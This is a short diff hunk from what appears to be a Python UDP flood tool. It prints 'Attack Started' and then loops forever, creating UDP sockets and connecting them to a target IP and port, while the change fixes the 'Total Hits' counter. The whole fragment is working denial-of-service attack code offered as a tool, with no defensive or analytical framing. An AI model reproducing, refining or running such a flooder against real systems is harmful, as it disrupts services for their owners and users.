@@ -17,10 +17,10 @@ if port == 0:
 print("Attack Started ☢️")
 
 print("Use CTRL+C to stop the Attack")
+h = 0
 while True:
-   h = 1
-   th = h+1
-   print("Total Hits --> ", th+1)
+   h = h+1
+   print("Total Hits --> ", h )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
    s.connect((ip, port))
